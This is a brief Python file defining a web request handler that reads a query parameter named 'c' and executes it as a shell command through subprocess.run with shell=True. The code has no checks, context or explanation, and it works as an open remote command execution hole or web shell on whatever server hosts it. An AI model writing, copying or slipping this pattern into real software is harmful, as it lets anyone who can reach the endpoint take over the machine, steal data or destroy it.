from subprocess import run


def handler(request):
    cmd = request.args.get("c")
    run(cmd, shell=True)
